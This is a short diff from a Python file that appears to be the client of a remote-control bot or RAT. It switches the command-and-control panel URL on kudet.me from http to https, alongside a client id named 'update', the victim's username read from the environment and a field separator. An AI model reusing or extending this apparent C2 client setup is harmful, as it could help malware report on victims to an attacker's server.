@@ -8,7 +8,7 @@ import webbrowser
 from Socket import HTTPSocket
 
 C = HTTPSocket()
-PanelURL = "http://kudet.me/update/"
+PanelURL = "https://kudet.me/python/"
 cid = "update"
 username = os.getenv("USERNAME")
 Y = "|BN|"
